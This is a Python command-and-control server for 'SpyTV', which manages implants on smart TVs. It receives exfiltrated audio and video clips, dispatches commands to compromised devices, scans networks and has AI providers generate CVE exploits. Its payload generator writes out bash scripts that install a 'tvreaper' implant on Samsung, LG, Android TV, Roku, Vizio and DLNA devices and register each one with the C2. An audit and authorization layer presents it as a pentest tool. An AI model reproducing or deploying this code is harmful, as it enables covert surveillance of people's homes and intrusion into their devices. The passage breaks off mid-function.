#!/usr/bin/env python3
"""SpyTV C2 Server: Web-based dashboard for managing TV implants.
Handles audio/video exfiltration, device control, command dispatch,
network scanning, and payload generation.
"""
import json
import os
import base64
import hashlib
import datetime
import threading
import time
import socket
import struct
import subprocess
import platform
import uuid
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from core.cve_scanner import CVEScanner, TV_CVE_DATABASE
from c2_cve_feed import (
    update_cve_database, get_feed, get_all_cves, load_ai_keys, save_ai_keys,
    generate_exploit_for_cve, ai_key_status, render_cve_whitepaper, AI_PROVIDERS,
    artifact_status, get_whitepaper_markdown,
)
import c2_audit
from c2_audit import (AuditEngagement, PatchEngagement, validate_client,
                      build_authorization_pdf, authorization_record_hash)
from c2_ops import (utc_now_iso, scan_network, perform_scan, check_target,
                    execute_patches, kill_all_connections, run_exploit)

# Device family -> CVE database key
FAMILY_TO_TV_TYPE = {
    "samsung-tizen": "samsung-tizen",
    "tizen-dev": "samsung-tizen",
    "samsung": "samsung-tizen",
    "lg-webos": "lg-webos",
    "webos-dev": "lg-webos",
    "lg": "lg-webos",
    "adb-net": "android-tv",
    "androidtv": "android-tv",
    "android tv": "android-tv",
    "fire tv": "android-tv",
    "roku-ecp": "roku",
    "roku": "roku",
    "roku tv": "roku",
    "vizio-dial": "vizio",
    "vizio": "vizio",
    "hisense": "hisense",
    "tcl": "tcl",
    "chromecast": "chromecast",
    "google tv": "chromecast",
    "google": "chromecast",
}

# Configuration
C2_HOST = "0.0.0.0"
C2_PORT = 8443
STORE_DIR = os.path.join("c2_data", "clips")
DEVICE_FILE = os.path.join("c2_data", "devices.json")
COMMAND_FILE = os.path.join("c2_data", "commands.json")
SCAN_FILE = os.path.join("c2_data", "scans.json")
LOGO_FILE = "logo.png"

os.makedirs(STORE_DIR, exist_ok=True)
os.makedirs(os.path.join(STORE_DIR, "audio"), exist_ok=True)
os.makedirs(os.path.join(STORE_DIR, "video"), exist_ok=True)

# Device registry
devices = {}
devices_lock = threading.Lock()

# Command queue
commands = {}
commands_lock = threading.Lock()

# Scan results
scans = []
scans_lock = threading.Lock()

# CVE scanner instance
cve_scanner = CVEScanner()

# CVE feed update state (updated in background at startup)
cve_feed_status = {"updating": False, "last_result": None, "new": 0}

# Engagement state — Audit button (T-03) and Patch-all button. Guarded by
# engagements_lock; started/stopped from the dashboard.
engagements_lock = threading.Lock()
audit_engagement = None    # c2_audit.AuditEngagement | None
patch_engagement = None    # c2_audit.PatchEngagement | None
authorizations = {}        # auth_id -> authorization record (also on disk)

# Server uptime facts (for the dashboard's Server tab — real values only)
SERVER_STARTED_AT = utc_now_iso()
SERVER_STARTED_MONO = time.time()

_SIGNATURE_MAX_BYTES = 400 * 1024


def _auth_dir(auth_id):
    """Safe archive directory for an authorization id (rejects traversal)."""
    auth_id = str(auth_id or "")
    if not auth_id or not all(c.isalnum() or c in "-_" for c in auth_id):
        return None
    return os.path.join(c2_audit.ARCHIVE_ROOT, auth_id)


def _decode_signature(value):
    """Decode + validate a drawn e-signature (base64 PNG dataURL).

    Returns ``(png_bytes, errors)``. Only well-formed PNGs under the size
    cap are accepted — the bytes are embedded in a legally binding
    authorization document, so nothing else gets through.
    """
    raw = str(value or "").strip()
    if not raw:
        return None, ["A drawn signature is required."]
    if raw.startswith("data:"):
        header, sep, b64 = raw.partition(",")
        if not sep or "base64" not in header:
            return None, ["Signature must be a base64 PNG data URL."]
        raw = b64.strip()
    try:
        png = base64.b64decode(raw, validate=True)
    except Exception:  # noqa: BLE001 — binascii.Error and friends
        return None, ["Signature is not valid base64."]
    if not png.startswith(b"\x89PNG\r\n\x1a\n"):
        return None, ["Signature must be a PNG image."]
    if len(png) > _SIGNATURE_MAX_BYTES:
        return None, [f"Signature image exceeds {_SIGNATURE_MAX_BYTES // 1024} KB."]
    if len(png) < 64:
        return None, ["Signature image is incomplete — please sign again."]
    return png, []


def load_authorization(auth_id):
    """Authorization record from memory, falling back to disk (restart-safe)."""
    with engagements_lock:
        rec = authorizations.get(auth_id)
    if rec:
        return rec
    out_dir = _auth_dir(auth_id)
    if not out_dir:
        return None
    path = os.path.join(out_dir, "authorization.json")
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                rec = json.load(f)
        except (IOError, json.JSONDecodeError):
            return None
        with engagements_lock:
            authorizations[auth_id] = rec
        return rec
    return None


def save_authorization(auth_id, rec):
    """Persist the authorization record (JSON sidecar) and cache it."""
    out_dir = _auth_dir(auth_id)
    if not out_dir:
        return
    os.makedirs(out_dir, exist_ok=True)
    with open(os.path.join(out_dir, "authorization.json"), "w",
              encoding="utf-8") as f:
        json.dump(rec, f, indent=2, default=str)
    with engagements_lock:
        authorizations[auth_id] = rec


def _idle_engagement(kind):
    """Status payload when no engagement of this kind has been started."""
    return {"kind": kind, "phase": "idle", "progress": 0, "log": [],
            "phases": [], "results": {}, "client": None,
            "report_ready": False, "report_url": None,
            "started_at": None, "finished_at": None, "error": None}


def get_local_ip():
    """Get the local IP address of this machine."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def load_devices():
    global devices
    if os.path.exists(DEVICE_FILE):
        try:
            with open(DEVICE_FILE, 'r') as f:
                devices = json.load(f)
        except (json.JSONDecodeError, IOError):
            devices = {}


def save_devices():
    with devices_lock:
        try:
            with open(DEVICE_FILE, 'w') as f:
                json.dump(devices, f, indent=2)
        except IOError:
            pass


def load_commands():
    global commands
    if os.path.exists(COMMAND_FILE):
        try:
            with open(COMMAND_FILE, 'r') as f:
                commands = json.load(f)
        except (json.JSONDecodeError, IOError):
            commands = {}


def save_commands():
    with commands_lock:
        try:
            with open(COMMAND_FILE, 'w') as f:
                json.dump(commands, f, indent=2)
        except IOError:
            pass


def load_scans():
    global scans
    if os.path.exists(SCAN_FILE):
        try:
            with open(SCAN_FILE, 'r') as f:
                scans = json.load(f)
        except (json.JSONDecodeError, IOError):
            scans = []


def save_scans():
    with scans_lock:
        try:
            with open(SCAN_FILE, 'w') as f:
                json.dump(scans, f, indent=2)
        except IOError:
            pass


def get_device_id(ip):
    return hashlib.sha1(ip.encode()).hexdigest()[:12]


def record_scan_results(results):
    """Append scan findings to history (capped at 100) and persist to disk.

    The lock is always released before the file write: ``save_scans()``
    acquires the non-reentrant ``scans_lock`` itself.
    """
    with scans_lock:
        scans.extend(results)
        scans[:] = scans[-100:]
    save_scans()


def generate_payload(target_ip, family, c2_ip):
    """Generate an exploit payload that connects back to the C2."""
    payload_url = f"http://{c2_ip}:{C2_PORT}/api/exfil"

    if family == "tizen-dev":
        payload = f"""#!/bin/bash
# Tizen Dev Mode Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Tizen implant on {target_ip}..."
sdb connect {target_ip}:26101
sdb install tvreaper.wgt
# Register with C2
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"Samsung(Tizen)","entry":"tizen-dev"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "webos-dev":
        payload = f"""#!/bin/bash
# webOS ares-install Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing webOS implant on {target_ip}..."
ares-install --device tv@{target_ip} tvreaper.ipk
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"LG(webOS)","entry":"webos-dev"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "adb-net":
        payload = f"""#!/bin/bash
# Android TV ADB Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Android TV implant on {target_ip}..."
adb connect {target_ip}:5555
adb -s {target_ip}:5555 install tvreaper.apk
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"AndroidTV","entry":"adb-net"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "roku-ecp":
        payload = f"""#!/bin/bash
# Roku ECP Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Roku implant on {target_ip}..."
curl -X POST http://{target_ip}:8060/install/851
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"RokuTV","entry":"roku-ecp"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "vizio-dial":
        payload = f"""#!/bin/bash
# Vizio DIAL Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Vizio implant on {target_ip}..."
curl -X POST http://{target_ip}:24825/apps/com.forge.tvreaper
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"Vizio","entry":"vizio-dial"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    else:
        payload = f"""#!/bin/bash
# Generic DLNA Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Attempting DLNA injection on {target_ip}..."
curl -X POST http://{target_ip}:49152/upnp/control/AVTransport \\
  -H "Content-Type: text/xml" \\
  -H "SOAPAction: urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI" \\
  -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><InstanceID>0</InstanceID><CurrentURI>http://{c2_ip}/tvreaper.js</CurrentURI></u:SetAVTransportURI></s:Body></s:Envelope>'
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"Unknown","entry":"dlna"}}'
echo "Implant attempted. C2: {c2_ip}"
"""

    return payload


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/" or path == "/index.html":
            self.serve_dashboard()
        elif path == "/api/devices":
            self.serve_devices()
        elif path == "/api/clips":
            self.serve_clips()
        elif path.startswith("/api/clip/"):
            self.serve_clip(path)
        elif path == "/api/commands":
            self.serve_commands()
        elif path == "/api/scans":
            self.serve_scans()
        elif path == "/api/cves":
            self.serve_cves()
        elif path == "/api/cve/feed":
            self.serve_cve_feed()
        elif path.startswith("/api/cve/whitepaper_doc/"):
            self.serve_cve_whitepaper_doc(path)
        elif path.startswith("/api/cve/artifacts/"):
            self.serve_cve_artifacts(path)
        elif path.startswith("/api/cve/whitepaper/"):
            self.serve_cve_whitepaper(path)
        elif path == "/api/audit/status":
            self.serve_audit_status()
        elif path == "/api/audit/report.pdf":
            self.serve_engagement_report("audit")
        elif path == "/api/audit/authorization.pdf":
            self.serve_authorization_pdf()
        elif path == "/api/patch/status":
            self.serve_patch_status()
        elif path == "/api/patch/report.pdf":
            self.serve_engagement_report("patch")
        elif path == "/api/local_ip":
            self.send_json(200, {"ip": get_local_ip()})
        elif path == "/api/host_info":
            self.serve_host_info()
        elif path == "/api/ai-keys":
            self.serve_ai_keys_status()
        elif path.startswith("/docs/"):
            self.serve_doc(path)
        elif path == "/logo.png":
            self.serve_logo()
        else:
            self.send_error(404)

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/api/register":
            self.handle_register()
        elif path == "/api/exfil":
            self.handle_exfil()
        elif path == "/api/command":
            self.handle_command()
        elif path == "/api/poll":
            self.handle_poll()
        elif path == "/api/scan":
            self.handle_scan()
        elif path == "/api/payload":
            self.handle_payload()
        elif path == "/api/cve/update":
            self.serve_cve_update()
        elif path == "/api/cve/patch":
            self.serve_cve_patch()
        elif path == "/api/cve/generate":
            self.serve_cve_generate()
        elif path == "/api/ai-keys":
            self.serve_ai_keys_save()
        elif path == "/api/check":
            self.handle_check()
        elif path == "/api/audit/authorize":
            self.handle_audit_authorize()
        elif path == "/api/audit/sign":
            self.handle_audit_sign()
        elif path == "/api/patch/start":
            self.handle_patch_start()
        elif path == "/api/patch/report":
            self.handle_patch_report()
        elif path == "/api/connections/kill":
            self.handle_kill_connections()
        else:
            self.send_error(404)

    def serve_dashboard(self):
        html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_dashboard.html")
        try:
            with open(html_path, 'r', encoding='utf-8') as f:
                html = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
        except IOError:
            self.send_error(404)

    def serve_devices(self):
        with devices_lock:
            self.send_json(200, list(devices.values()))

    def serve_clips(self):
        clips = []
        for root, dirs, files in os.walk(STORE_DIR):
            for f in files:
                if f.endswith(('.wav', '.jpeg', '.jpg', '.png', '.ts')):
                    rel = os.path.relpath(os.path.join(root, f), STORE_DIR)
                    parts = rel.replace('\\', '/').split('/')
                    if len(parts) >= 2:
                        kind = parts[0]
                        fname = parts[-1]
                        device_id = fname.split('_')[0] if '_' in fname else 'unknown'
                        clips.append({
                            "id": hashlib.sha1(rel.encode()).hexdigest()[:12],
                            "device_id": device_id,
                            "kind": kind,
                            "filename": fname,
                            "path": rel,
                            "size": os.path.getsize(os.path.join(root, f)),
                            "timestamp": os.path.getctime(os.path.join(root, f))
                        })
        self.send_json(200, clips)

    def serve_clip(self, path):
        clip_id = path.split("/")[-1]
        for root, dirs, files in os.walk(STORE_DIR):
            for f in files:
                rel = os.path.relpath(os.path.join(root, f), STORE_DIR)
                cid = hashlib.sha1(rel.encode()).hexdigest()[:12]
                if cid == clip_id:
                    full_path = os.path.join(root, f)
                    content_type = "audio/wav" if f.endswith('.wav') else \
                                   "image/jpeg" if f.endswith(('.jpeg', '.jpg')) else \
                                   "image/png" if f.endswith('.png') else \
                                   "video/mp2t" if f.endswith('.ts') else "application/octet-stream"
                    try:
                        with open(full_path, 'rb') as fh:
                            data = fh.read()
                        self.send_response(200)
                        self.send_header("Content-Type", content_type)
                        self.send_header("Content-Length", str(len(data)))
                        self.end_headers()
                        self.wfile.write(data)
                        return
                    except IOError:
                        pass
        self.send_error(404)

    def serve_commands(self):
        with commands_lock:
            self.send_json(200, commands)

    def serve_scans(self):
        with scans_lock:
            self.send_json(200, scans)

    def serve_logo(self):
        try:
            with open(LOGO_FILE, 'rb') as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        except IOError:
            self.send_error(404)

    def serve_cve_feed(self):
        """CVE feed for the dashboard sidebar (entries + links + AI status)."""
        try:
            feed = get_feed()
            feed["updating"] = cve_feed_status["updating"]
            feed["last_result"] = cve_feed_status["last_result"]
            self.send_json(200, feed)
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def serve_cve_whitepaper(self, path):
        """Render a per-CVE whitepaper as HTML."""
        cve_id = path.rsplit("/", 1)[-1]
        html = render_cve_whitepaper(cve_id)
        if not html:
            self.send_error(404)
            return
        data = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def serve_cve_whitepaper_doc(self, path):
        """Raw whitepaper markdown for the dashboard output panel (T-01).

        Prefers the generated file in docs/whitepapers/; falls back to the
        deterministic template so the viewer always has content.
        """
        cve_id = path.rsplit("/", 1)[-1]
        doc = get_whitepaper_markdown(cve_id)
        if not doc:
            self.send_json(404, {"error": f"unknown CVE {cve_id}"})
            return
        markdown, source = doc
        self.send_json(200, {
            "id": cve_id,
            "markdown": markdown,
            "source": source,          # "file" (generated) | "template"
            "generated": source == "file",
        })

    def serve_cve_artifacts(self, path):
        """Per-CVE artifact inventory — files + T-02 flags (T-01 viewer)."""
        cve_id = path.rsplit("/", 1)[-1]
        status = artifact_status(cve_id)
        if not status:
            self.send_json(404, {"error": f"unknown CVE {cve_id}"})
            return
        self.send_json(200, status)

    def serve_cve_generate(self):
        """Generate an exploit module for a CVE via the configured AI provider."""
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            cve_id = data.get('cve_id', '')
            provider = data.get('provider') or None
            model = data.get('model') or None

            code, error = generate_exploit_for_cve(cve_id, provider, model)
            if error:
                self.send_json(400, {"error": error})
            else:
                self.send_json(200, {
                    "cve_id": cve_id, "code": code,
                    "provider": provider or "auto",
                    "model": model or "default",
                })
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def serve_ai_keys_status(self):
        """Masked AI provider key status for the dashboard."""
        try:
            self.send_json(200, ai_key_status())
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def serve_ai_keys_save(self):
        """Save AI provider API keys from the dashboard."""
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            save_ai_keys(data)
            self.send_json(200, {"status": "ok", "ai": ai_key_status()})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def serve_doc(self, path):
        """Serve docs/*.md rendered as HTML so guides are viewable from the C2."""
        import html as html_mod
        name = path[len("/docs/"):]
        if not name.endswith(".md") or "/" in name or "\\" in name or ".." in name:
            self.send_error(404)
            return
        doc_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "docs", name)
        try:
            with open(doc_path, 'r', encoding='utf-8') as fh:
                md = fh.read()
        except IOError:
            self.send_error(404)
            return

        # Minimal, safe markdown -> HTML rendering (headers, code, lists, links).
        out_lines = []
        in_code = False
        for line in md.splitlines():
            esc = html_mod.escape(line)
            if line.startswith("```"):
                if in_code:
                    out_lines.append("</code></pre>")
                    in_code = False
                else:
                    out_lines.append("<pre><code>")
                    in_code = True
                continue
            if in_code:
                out_lines.append(esc)
                continue
            if line.startswith("#"):
                level = len(line) - len(line.lstrip("#"))
                level = min(max(level, 1), 5)
                out_lines.append(
                    f"<h{level}>{html_mod.escape(line.lstrip('# ').strip())}</h{level}>")
            elif line.startswith(("- ", "* ")):
                out_lines.append(f"<li>{html_mod.escape(line[2:].strip())}</li>")
            elif line.strip() == "":
                out_lines.append("<br>")
            else:
                out_lines.append(f"<p>{esc}</p>")
        body = "\n".join(out_lines)
        page = f"""<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{html_mod.escape(name)} — SpyTV Docs</title>
<style>
 body {{ background:#0B0E14; color:#F3F4F6; font-family:-apple-system,'Segoe UI',Roboto,sans-serif;
        max-width:860px; margin:0 auto; padding:32px; line-height:1.65; }}
 h1,h2,h3,h4,h5 {{ color:#F3F4F6; margin-top:24px; }}
 h1 {{ font-size:22px; }} h2 {{ font-size:17px; }} h3 {{ font-size:14px; }}
 p,li {{ color:#D1D5DB; font-size:14px; }}
 pre {{ background:#111827; border:1px solid #1F2937; border-radius:8px;
       padding:14px; overflow-x:auto; }}
 code {{ font-family:Consolas,'SF Mono',monospace; font-size:13px; color:#93C5FD; }}
 a {{ color:#3B82F6; }} .back {{ font-size:13px; }}
</style></head><body>
<p class="back"><a href="/">&#8592; Back to C2 Dashboard</a> &middot;
<a href="/docs/TROUBLESHOOTING.md">Troubleshooting</a> &middot;
<a href="/docs/C2_DASHBOARD.md">C2 Dashboard Guide</a></p>
{body}</body></html>"""
        data = page.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def serve_cves(self):
        """Return all known CVEs from the TV vulnerability database."""
        all_cves = []
        for tv_type, info in TV_CVE_DATABASE.items():
            for cve in info["cves"]:
                all_cves.append({
                    **cve,
                    "tv_type": tv_type,
                    "device_name": info["name"],
                    "ports": info["ports"],
                    "bluetooth": info["bluetooth"],
                    "ssh": info["ssh"],
                })
        self.send_json(200, all_cves)

    def serve_cve_update(self):
        """Fetch new CVEs from NVD (background) and kick off exploit generation.

        Returns immediately with the current feed; the update thread logs new
        entries to CVE_UPDATES.log in the repo root and regenerates the feed.
        """
        if cve_feed_status["updating"]:
            self.send_json(200, {"status": "updating", "feed": get_feed()})
            return

        def _run():
            cve_feed_status["updating"] = True
            try:
                new = update_cve_database()
                cve_feed_status["new"] = len(new)
                cve_feed_status["last_result"] = (
                    f"{len(new)} new CVE(s) ingested"
                    if new else "No new CVEs")
                print(f"[CVE] {cve_feed_status['last_result']} — "
                      f"logged to CVE_UPDATES.log")
            except Exception as e:  # noqa: BLE001
                cve_feed_status["last_result"] = f"error: {e}"
                print(f"[CVE] update failed: {e}")
            finally:
                cve_feed_status["updating"] = False

        threading.Thread(target=_run, daemon=True).start()
        self.send_json(200, {"status": "updating", "feed": get_feed()})

    def serve_cve_patch(self):
        """Execute the remediation commands for a matched TV (Patch button).

        Runs the device-family patch commands against the target via
        c2_ops.execute_patches, capturing per-command output so the
        dashboard can show exactly what ran and what failed.
        """
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            ip = data.get('ip', '')
            tv_type = data.get('tv_type', '')
            family = data.get('family', '')

            if not tv_type and family:
                tv_type = FAMILY_TO_TV_TYPE.get(family.lower().split("(")[0].strip(),
                                                family.lower())
            if not ip or not tv_type or tv_type not in TV_CVE_DATABASE:
                self.send_json(400, {
                    "error": "Missing/unknown ip or tv_type",
                    "known_types": list(TV_CVE_DATABASE.keys()),
                })
                return

            result = execute_patches(ip, tv_type, cve_scanner)

            # Remove the device's vulnerable CVEs from its record + mark patched.
            with devices_lock:
                for dev in devices.values():
                    if dev.get("ip") == ip:
                        dev["patched"] = True
                        dev["patched_at"] = utc_now_iso()
                        dev["patched_cves"] = TV_CVE_DATABASE[tv_type]["cves"]
            save_devices()  # acquires devices_lock itself — must be outside the block

            ok = result["ok"]
            self.send_json(200, {
                "status": "ok" if ok else "partial",
                "ip": ip,
                "tv_type": tv_type,
                "patched": ok,
                "total": result["total"],
                "cves_fixed": result["cves_fixed"],
                "patches": result["patches"],
            })
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_register(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            ip = data.get('ip', '')
            family = data.get('family', 'unknown')
            entry = data.get('entry', 'unknown')
            if not ip:
                self.send_json(400, {"error": "Missing IP"})
                return
            device_id = get_device_id(ip)
            with devices_lock:
                devices[device_id] = {
                    "id": device_id,
                    "ip": ip,
                    "family": family,
                    "entry": entry,
                    "status": "online",
                    "last_seen": utc_now_iso(),
                    "registered_at": devices.get(device_id, {}).get("registered_at",
                        utc_now_iso())
                }
            save_devices()
            self.send_json(200, {"status": "ok", "device_id": device_id})
        except (json.JSONDecodeError, IOError) as e:
            self.send_json(400, {"error": str(e)})

    def handle_exfil(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            content_type = self.headers.get('Content-Type', '')
            device_id = self.headers.get('X-Device-ID', 'unknown')
            kind = self.headers.get('X-Clip-Kind', 'audio')

            if 'multipart/form-data' in content_type:
                boundary = content_type.split('boundary=')[-1].strip()
                parts = body.split(f'--{boundary}'.encode())
                for part in parts:
                    if b'filename=' in part:
                        header_end = part.find(b'\r\n\r\n')
                        if header_end > 0:
                            file_data = part[header_end + 4:]
                            if file_data.endswith(b'\r\n'):
                                file_data = file_data[:-2]
                            break
                else:
                    file_data = body
            else:
                file_data = body

            timestamp = datetime.datetime.now(datetime.timezone.utc).strftime('%H%M%S')
            date_dir = datetime.datetime.now(datetime.timezone.utc).strftime('%Y%m%d')
            kind_dir = os.path.join(STORE_DIR, kind, date_dir)
            os.makedirs(kind_dir, exist_ok=True)
            filename = f"{device_id}_{timestamp}.{'wav' if kind == 'audio' else 'jpeg'}"
            filepath = os.path.join(kind_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(file_data)

            updated = False
            with devices_lock:
                if device_id in devices:
                    devices[device_id]["last_seen"] = utc_now_iso()
                    devices[device_id]["status"] = "online"
                    updated = True
            if updated:
                save_devices()  # never call while holding devices_lock (non-reentrant)

            self.send_json(200, {"status": "ok", "filename": filename})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_command(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            device_id = data.get('device_id', '')
            command = data.get('command', '')
            params = data.get('params', {})

            if not device_id or not command:
                self.send_json(400, {"error": "Missing device_id or command"})
                return

            with commands_lock:
                if device_id not in commands:
                    commands[device_id] = []
                commands[device_id].append({
                    "command": command,
                    "params": params,
                    "timestamp": utc_now_iso(),
                    "status": "pending"
                })
            save_commands()
            self.send_json(200, {"status": "ok"})
        except (json.JSONDecodeError, IOError) as e:
            self.send_json(400, {"error": str(e)})

    def handle_poll(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            device_id = data.get('device_id', '')

            with commands_lock:
                device_commands = commands.get(device_id, [])
                pending = [c for c in device_commands if c["status"] == "pending"]
                for c in pending:
                    c["status"] = "delivered"
                commands[device_id] = [c for c in device_commands if c["status"] != "delivered"]

            updated = False
            with devices_lock:
                if device_id in devices:
                    devices[device_id]["last_seen"] = utc_now_iso()
                    devices[device_id]["status"] = "online"
                    updated = True
            if updated:
                save_devices()  # never call while holding devices_lock (non-reentrant)

            self.send_json(200, {"commands": pending})
        except (json.JSONDecodeError, IOError) as e:
            self.send_json(400, {"error": str(e)})

    def handle_scan(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            cidr = data.get('cidr', None)

            # Shared discovery pipeline (generic ports + CVE signature
            # ports + family/CVE matching) lives in c2_ops.perform_scan so
            # the Scan button and the Audit engagement stay in lockstep.
            results = perform_scan(cidr, cve_scanner)

            record_scan_results(results)

            self.send_json(200, {"status": "ok", "found": len(results), "results": results})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_payload(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            target_ip = data.get('target_ip', '')
            family = data.get('family', 'dlna')
            c2_ip = data.get('c2_ip', get_local_ip())

            if not target_ip:
                self.send_json(400, {"error": "Missing target_ip"})
                return

            payload = generate_payload(target_ip, family, c2_ip)
            self.send_json(200, {"status": "ok", "payload": payload, "target_ip": target_ip, "family": family, "c2_ip": c2_ip})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    # -- engagement endpoints (Audit / Patch-all buttons) -------------------
    def _read_json_body(self):
        length = int(self.headers.get('Content-Length', 0) or 0)
        body = self.rfile.read(length) if length else b""
        if not body:
            return {}
        return json.loads(body)

    def handle_check(self):
        """POST /api/check — read-only verification of one target.

        T-03 phase 2: probe ports, match family/CVEs and confirm exploit
        availability WITHOUT transmitting any payloads.
        """
        try:
            data = self._read_json_body()
            ip = str(data.get("ip", "")).strip()
            if not ip:
                self.send_json(400, {"error": "Missing ip"})
                return
            result = check_target(ip, cve_scanner)
            self.send_json(200, {"status": "ok", "result": result})
        except json.JSONDecodeError as e:
            self.send_json(400, {"error": str(e)})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_audit_authorize(self):
        """POST /api/audit/authorize — validate the client details and stage
        the unsigned authorization form (Rules of Engagement) for e-signature.
        """
        try:
            data = self._read_json_body()
            client, errors = validate_client(data.get("client") or data)
            if errors:
                self.send_json(400, {"error": "Invalid client details",
                                     "errors": errors})
                return

            auth_id = c2_audit.new_report_id("AUTH")
            out_dir = _auth_dir(auth_id)
            os.makedirs(out_dir, exist_ok=True)
            pdf = build_authorization_pdf(client, auth_id)
            with open(os.path.join(out_dir, "authorization.pdf"), "wb") as f:
                f.write(pdf)

            expires = (datetime.datetime.now(datetime.timezone.utc)
                       + datetime.timedelta(days=c2_audit.AUTH_VALID_DAYS))
            rec = {
                "auth_id": auth_id,
                "client": client,
                "signed": False,
                "created_at": utc_now_iso(),
                "expires_at": expires.isoformat().replace("+00:00", ""),
                "signer_ip": None,
                "signed_at": None,
                "record_hash": authorization_record_hash(auth_id, client,
                                                         None, None),
                "report_id": None,
            }
            save_authorization(auth_id, rec)
            self.send_json(200, {
                "status": "ok",
                "auth_id": auth_id,
                "client": client,
                "pdf_url": f"/api/audit/authorization.pdf?auth_id={auth_id}"
                           "&state=unsigned",
                "expires_days": c2_audit.AUTH_VALID_DAYS,
                "record_hash": rec["record_hash"],
            })
        except json.JSONDecodeError as e:
            self.send_json(400, {"error": str(e)})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_audit_sign(self):
        """POST /api/audit/sign — execute the authorization with the client's
        drawn signature (provider is pre-signed), archive the signed
        instrument, then start the audit engagement.
        """
        global audit_engagement
        try:
            data = self._read_json_body()
            auth_id = str(data.get("auth_id", "")).strip()
            rec = load_authorization(auth_id)
            if not rec:
                self.send_json(404, {"error": "Unknown authorization id"})
                return
            if rec.get("signed"):
                self.send_json(409, {"error": "This authorization has already "
                                              "been signed."})
                return

            signature_png, errors = _decode_signature(data.get("signature"))
            if errors:
                self.send_json(400, {"error": "Invalid signature",
                                     "errors": errors})
                return

            # The signer may confirm/override the client entity they are
            # signing on behalf of — it feeds the executed instrument.
            signer_company = str(data.get("signer_company", "") or "").strip()
            if signer_company:
                rec["client"]["company"] = signer_company

            client = rec["client"]
            signed_at = utc_now_iso()
            signer_ip = self.client_address[0] if self.client_address else None
            record_hash = authorization_record_hash(auth_id, client,
